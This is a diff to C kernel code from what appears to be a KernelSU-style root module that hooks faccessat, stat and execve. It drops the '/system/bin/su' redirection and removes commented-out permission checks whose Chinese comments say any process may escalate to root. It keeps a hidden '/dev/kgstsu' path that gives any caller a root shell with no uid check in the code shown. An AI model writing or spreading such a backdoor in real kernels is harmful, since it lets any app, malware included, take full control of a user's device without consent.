@@ -22,8 +22,6 @@
 #include "hook/syscall_hook.h"
 #include "sulog/event.h"
 
-#define SU_PATH "/system/bin/su"
-#define SH_PATH "/system/bin/sh"
 #define KGSTSU_PATH "/dev/kgstsu"
 
 bool ksu_su_compat_enabled __read_mostly = true;
@@ -65,7 +63,6 @@ static char __user *sh_user_path(void)
     return userspace_stack_buffer(sh_path, sizeof(sh_path));
 }
 
-/* kgstsu 使用 sh_user_path 即可 */
 #define kgstsu_sh_user_path() sh_user_path()
 
 static char __user *ksud_user_path(void)
@@ -77,22 +74,13 @@ static char __user *ksud_user_path(void)
 
 int ksu_handle_faccessat(int *dfd, const char __user **filename_user, int *mode, int *__unused_flags)
 {
-    const char su[] = SU_PATH;
     const char kgstsu[] = KGSTSU_PATH;
-
-    /* 权限检查已移除，任何进程都可以使用 su */
-    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) { */
-    /*     return 0; */
-    /* } */
 
     char path[64];
     memset(path, 0, sizeof(path));
     strncpy_from_user_nofault(path, *filename_user, sizeof(path));
 
-    if (unlikely(!memcmp(path, su, sizeof(su)))) {
-        pr_info("faccessat su->sh!\n");
-        *filename_user = sh_user_path();
-    } else if (unlikely(!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0')) {
+    if (unlikely(!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0')) {
         pr_info("faccessat kgstsu->sh!\n");
         *filename_user = kgstsu_sh_user_path();
     }
@@ -102,14 +90,7 @@ int ksu_handle_faccessat(int *dfd, const char __user **filename_user, int *mode,
 
 int ksu_handle_stat(int *dfd, const char __user **filename_user, int *flags)
 {
-    // const char sh[] = SH_PATH;
-    const char su[] = SU_PATH;
     const char kgstsu[] = KGSTSU_PATH;
-
-    /* 权限检查已移除，任何进程都可以使用 su */
-    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) { */
-    /*     return 0; */
-    /* } */
 
     if (unlikely(!filename_user)) {
         return 0;
@@ -119,10 +100,7 @@ int ksu_handle_stat(int *dfd, const char __user **filename_user, int *flags)
     memset(path, 0, sizeof(path));
     strncpy_from_user_nofault(path, *filename_user, sizeof(path));
 
-    if (unlikely(!memcmp(path, su, sizeof(su)))) {
-        pr_info("newfstatat su->sh!\n");
-        *filename_user = sh_user_path();
-    } else if (unlikely(!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0')) {
+    if (unlikely(!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0')) {
         pr_info("newfstatat kgstsu->sh!\n");
         *filename_user = kgstsu_sh_user_path();
     }
@@ -132,7 +110,6 @@ int ksu_handle_stat(int *dfd, const char __user **filename_user, int *flags)
 
 long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, const struct pt_regs *regs)
 {
-    const char su[] = SU_PATH;
     const char kgstsu[] = KGSTSU_PATH;
     const char __user *fn;
     const char __user *const __user *argv_user = (const char __user *const __user *)PT_REGS_PARM2(regs);
@@ -143,10 +120,6 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
 
     if (unlikely(!filename_user))
         goto do_orig_execve;
-
-    /* 权限检查已移除，任何进程都可以执行 su 直接提权 */
-    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) */
-    /*     goto do_orig_execve; */
 
     addr = untagged_addr((unsigned long)*filename_user);
     fn = (const char __user *)addr;
@@ -159,7 +132,7 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
         goto do_orig_execve;
     }
 
-    /* 优先检测 kgstsu 命令 */
+    /* 检测 kgstsu 命令 */
     if (!strncmp(path, kgstsu, sizeof(kgstsu) - 1) && path[sizeof(kgstsu) - 1] == '\0') {
         pr_info("kgstsu: found, escaping to root shell\n");
         pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
@@ -181,30 +154,6 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
         }
         return ret;
     }
-
-    if (likely(memcmp(path, su, sizeof(su))))
-        goto do_orig_execve;
-
-    pr_info("sys_execve su found, escaping to root shell\n");
-    pending_sucompat = ksu_sulog_capture_sucompat(*filename_user, argv_user, GFP_KERNEL);
-    *filename_user = sh_user_path();  // 直接执行 sh，获得 root shell
-
-    ret = escape_with_root_profile();
-    if (ret) {
-        pr_err("escape_with_root_profile failed: %ld\n", ret);
-        ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-        goto do_orig_execve;
-    }
-
-    ret = ksu_syscall_table[orig_nr](regs);
-    if (ret < 0) {
-        pr_err("failed to execve sh as su: %ld\n", ret);
-        ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-    } else {
-        ksu_sulog_emit_pending(pending_sucompat, ret, GFP_KERNEL);
-    }
-
-    return ret;
 
 do_orig_execve:
     return ksu_syscall_table[orig_nr](regs);
